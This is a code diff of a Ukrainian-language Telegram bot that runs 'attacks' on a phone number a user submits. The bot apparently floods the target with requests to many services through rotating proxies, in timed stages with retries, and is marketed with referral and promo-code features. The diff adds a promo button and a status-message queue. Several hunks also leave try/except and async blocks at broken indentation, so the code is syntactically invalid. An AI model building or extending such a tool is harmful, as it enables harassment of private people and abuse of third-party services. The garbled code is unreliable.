@@ -263,8 +263,8 @@ profile_button = types.KeyboardButton('🎯 Почати атаку')
 referal_button = types.KeyboardButton('🆘 Допомога')
 referral_program_button = types.KeyboardButton('🎪 Запросити друга')
 check_attacks_button = types.KeyboardButton('❓ Перевірити атаки')
-# promo_button = types.KeyboardButton('Промокод 🎁')  # Прибрано
-profile_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True).add(profile_button, referal_button).add(referral_program_button, check_attacks_button)
+promo_code_button = types.KeyboardButton('У мене є промокод')
+profile_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True).add(profile_button, referal_button).add(referral_program_button, check_attacks_button).add(promo_code_button)
 
 admin_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
 admin_keyboard.add("Надіслати повідомлення користувачам")
@@ -726,7 +726,7 @@ async def reload_proxies(message: Message):
 
 # ПРОМОКОДЫ - ПОЛЬЗОВАТЕЛИ
 
-@dp.message_handler(text='Промокод 🎁')
+@dp.message_handler(text='У мене є промокод')
 async def promo_handler(message: types.Message):
     # Перевіряємо, що повідомлення з особистого чату
     if message.chat.type != 'private':
@@ -1367,9 +1367,9 @@ async def ukr(number, chat_id, proxy_counter=None, shuffled_proxies_list=None):
         use_custom_session = req_cookies is not None
         
         for attempt in range(MAX_RETRIES + 1):
-            try:
-                if not attack_flags.get(chat_id):
-                    return
+        try:
+            if not attack_flags.get(chat_id):
+                return
                 
                 # При retry пробуємо випадковий новий проксі (якщо є)
                 if attempt > 0 and shuffled_proxies and USE_PROXIES:
@@ -1409,12 +1409,12 @@ async def ukr(number, chat_id, proxy_counter=None, shuffled_proxies_list=None):
                                 logging.debug(f"[ATTACK] Success - {number} -> {url}")
                                 return True
                     else:
-                        async with session.post(url, **kwargs) as response:
-                            if response.status == 200:
+                async with session.post(url, **kwargs) as response:
+                    if response.status == 200:
                                 logging.debug(f"[ATTACK] Success - {number} -> {url}")
                                 return True
                 return False
-            except asyncio.TimeoutError:
+        except asyncio.TimeoutError:
                 # Таймаути вимкнені, але залишаємо обробку на випадок інших помилок
                 if attempt < MAX_RETRIES:
                     logging.debug(f"[ATTACK] Retry {attempt+1} for {url}")
@@ -1429,17 +1429,17 @@ async def ukr(number, chat_id, proxy_counter=None, shuffled_proxies_list=None):
                     else:
                         _proxy_circuit_breaker[original_proxy] = (1, now)
                 return False
-            except aiohttp.ClientError as e:
+        except aiohttp.ClientError as e:
                 if attempt < MAX_RETRIES:
                     logging.debug(f"[ATTACK] ClientError retry {attempt+1} for {url}: {e}")
                     await asyncio.sleep(0.2 * (attempt + 1))
                     continue
                 logging.debug(f"[ATTACK] ClientError after {MAX_RETRIES+1} attempts: {url} - {e}")
                 return False
-            except Exception as e:
+        except Exception as e:
                 logging.debug(f"[ATTACK] Exception for {url}: {e}")
                 return False
-        
+
         return False
 
     # Semaphore для контролю паралелізму (зменшено для плавної роботи)
@@ -1526,7 +1526,7 @@ async def ukr(number, chat_id, proxy_counter=None, shuffled_proxies_list=None):
 
     if not attack_flags.get(chat_id):
         return
-    
+        
     # Рандомізуємо порядок сервісів на кожному етапі для максимальної випадковості
     import random
     random.shuffle(tasks)
@@ -1583,23 +1583,78 @@ async def start_attack(number, chat_id, status_message_id: int = None):
             logging.error(f"[ATTACK] Помилка отримання проксі: {e}")
             global_proxies_pool = []
 
-    async def update_status(text: str):
-        """Оновлює статус повідомлення замість створення нового"""
-        if status_message_id:
+    # Дебаунсинг та черга для update_status - оптимізована відправка повідомлень
+    _status_queue = asyncio.Queue()
+    _last_status_update = {'time': 0}
+    _status_task = None
+    
+    async def _status_updater():
+        """Фоновий процес для плавного оновлення статусів"""
+        while True:
             try:
-                await bot.edit_message_text(
-                    chat_id=chat_id,
-                    message_id=status_message_id,
-                    text=text,
-                    parse_mode="HTML",
-                    reply_markup=get_cancel_keyboard()
-                )
+                # Чекаємо повідомлення з черги
+                item = await asyncio.wait_for(_status_queue.get(), timeout=1.0)
+                if item is None:  # Сигнал завершення
+                    break
+                
+                text_to_send, show_cancel_btn = item
+                
+                # Додаткова затримка між оновленнями (1 сек) для плавності
+                now = asyncio.get_event_loop().time()
+                time_since_last = now - _last_status_update['time']
+                if time_since_last < 1.0:
+                    await asyncio.sleep(1.0 - time_since_last)
+                
+                _last_status_update['time'] = asyncio.get_event_loop().time()
+                
+                if status_message_id:
+                    try:
+                        # Якщо це повідомлення про зупинку, не показуємо кнопку
+                        reply_markup = get_cancel_keyboard() if show_cancel_btn and "зупинена" not in text_to_send.lower() else None
+                        await bot.edit_message_text(
+                            chat_id=chat_id,
+                            message_id=status_message_id,
+                            text=text_to_send,
+                            parse_mode="HTML",
+                            reply_markup=reply_markup
+                        )
+                    except Exception as e:
+                        # Якщо не вдалося оновити, створюємо нове
+                        logging.debug(f"Could not edit message, sending new: {e}")
+                        reply_markup = get_cancel_keyboard() if show_cancel_btn and "зупинена" not in text_to_send.lower() else None
+                        try:
+                            await bot.send_message(chat_id, text_to_send, parse_mode="HTML", reply_markup=reply_markup)
+                        except Exception:
+                            pass
+                else:
+                    reply_markup = get_cancel_keyboard() if show_cancel_btn and "зупинена" not in text_to_send.lower() else None
+                    try:
+                        await bot.send_message(chat_id, text_to_send, parse_mode="HTML", reply_markup=reply_markup)
+                    except Exception:
+                        pass
+            except asyncio.TimeoutError:
+                continue
             except Exception as e:
-                # Якщо не вдалося оновити (наприклад, повідомлення не змінилося), створюємо нове
-                logging.debug(f"Could not edit message, sending new: {e}")
-                asyncio.create_task(bot.send_message(chat_id, text, parse_mode="HTML"))
-        else:
-            asyncio.create_task(bot.send_message(chat_id, text, parse_mode="HTML"))
+                logging.debug(f"Status updater error: {e}")
+    
+    # Запускаємо фоновий процес оновлення статусів
+    _status_task = asyncio.create_task(_status_updater())
+    
+    async def update_status(text: str, show_cancel: bool = True):
+        """Оновлює статус повідомлення через чергу для плавної відправки"""
+        # Додаємо в чергу (останній елемент завжди замінює попередній)
+        try:
+            # Очищаємо чергу від старих повідомлень (залишаємо тільки останнє)
+            while not _status_queue.empty():
+                try:
+                    _status_queue.get_nowait()
+                except asyncio.QueueEmpty:
+                    break
+            
+            # Додаємо нове повідомлення
+            await _status_queue.put((text, show_cancel))
+        except Exception as e:
+            logging.debug(f"Error adding to status queue: {e}")
 
     try:
         # Перед атакою: перевіряємо проксі та оновлюємо метрики
@@ -1612,12 +1667,12 @@ async def start_attack(number, chat_id, status_message_id: int = None):
         while (asyncio.get_event_loop().time() - start_time) < timeout and stage_num < MAX_STAGES:
             if not attack_flags.get(chat_id):
                 logging.info(f"Атаку на номер {number} зупинено користувачем.")
-                await update_status(f'🛑 Атака на номер <i>{number}</i> зупинена користувачем.')
+                await update_status(f'🛑 Атака на номер <i>{number}</i> зупинена користувачем.', show_cancel=False)
                 return
             
             stage_num += 1
             logging.info(f"[ATTACK] Етап {stage_num}/{MAX_STAGES} для {number}")
-            await update_status(f'🎯 Місія в процесі\n\n📱 Ціль: <i>{number}</i>\n\n⚡ Етап: {stage_num}/{MAX_STAGES}')
+            await update_status(f'🎯 Місія в процесі\n\n📱 Ціль: <i>{number}</i>\n\n⚡ Етап: {stage_num}/{MAX_STAGES}', show_cancel=True)
             
             # Перемішуємо проксі на кожному етапі для максимізації випадковості
             import random
@@ -1635,14 +1690,14 @@ async def start_attack(number, chat_id, status_message_id: int = None):
             
             if not attack_flags.get(chat_id):
                 logging.info(f"Атаку на номер {number} зупинено користувачем.")
-                await update_status(f'🛑 Атака на номер <i>{number}</i> зупинена користувачем.')
+                await update_status(f'🛑 Атака на номер <i>{number}</i> зупинена користувачем.', show_cancel=False)
                 return
-            
+                
             # Пауза між етапами (якщо не останній етап і не вичерпано час)
             if stage_num < MAX_STAGES and (asyncio.get_event_loop().time() - start_time) < (timeout - 10):
                 pause_time = random.randint(PAUSE_MIN, PAUSE_MAX)
                 logging.info(f"[ATTACK] Пауза {pause_time} сек перед наступним етапом...")
-                await update_status(f'🎯 Місія в процесі\n\n📱 Ціль: <i>{number}</i>\n\n⚡ Етап: {stage_num}/{MAX_STAGES}\n⏸ Пауза {pause_time} сек...')
+                await update_status(f'🎯 Місія в процесі\n\n📱 Ціль: <i>{number}</i>\n\n⚡ Етап: {stage_num}/{MAX_STAGES}\n⏸ Пауза {pause_time} сек...', show_cancel=True)
                 
                 # Перевіряємо під час паузи чи не зупинили атаку
                 elapsed = 0
@@ -1654,12 +1709,21 @@ async def start_attack(number, chat_id, status_message_id: int = None):
                     elapsed += sleep_chunk
             
     except asyncio.CancelledError:
-        await update_status(f'🛑 Атака на номер <i>{number}</i> зупинена.')
+        await update_status(f'🛑 Атака на номер <i>{number}</i> зупинена.', show_cancel=False)
     except Exception as e:
         logging.error(f"Критична помилка при виконанні атаки: {e}")
-        await update_status(f'❌ Помилка при виконанні атаки на номер <i>{number}</i>.')
+        await update_status(f'❌ Помилка при виконанні атаки на номер <i>{number}</i>.', show_cancel=False)
     finally:
         attack_flags[chat_id] = False
+        # Зупиняємо фоновий процес оновлення статусів
+        if '_status_task' in locals() and _status_task:
+            try:
+                await _status_queue.put(None)  # Сигнал завершення
+                await asyncio.wait_for(_status_task, timeout=2.0)
+            except (asyncio.TimeoutError, asyncio.CancelledError):
+                _status_task.cancel()
+            except Exception as e:
+                logging.debug(f"Error stopping status updater: {e}")
 
     logging.info(f"Атака на номер {number} завершена")
     
@@ -1694,9 +1758,9 @@ async def start_attack(number, chat_id, status_message_id: int = None):
                 chat_id=chat_id,
                 message_id=status_message_id,
                 text=final_text,
-                parse_mode="html",
-                reply_markup=inline_keyboard2
-            )
+        parse_mode="html",
+        reply_markup=inline_keyboard2
+    )
         except Exception:
             # Якщо не вдалося оновити, відправляємо нове повідомлення асинхронно
             asyncio.create_task(bot.send_message(
@@ -1991,7 +2055,7 @@ async def handle_phone_number(message: Message):
         return  # Ігноруємо повідомлення з груп
     
     # Ігноруємо текст кнопок
-    button_texts = ['🆘 Допомога', '🎪 Запросити друга', '🎯 Почати атаку', '❓ Перевірити атаки']
+    button_texts = ['🆘 Допомога', '🎪 Запросити друга', '🎯 Почати атаку', '❓ Перевірити атаки', 'У мене є промокод']
     if message.text in button_texts or message.text.strip().startswith('/stats'):
         return
     
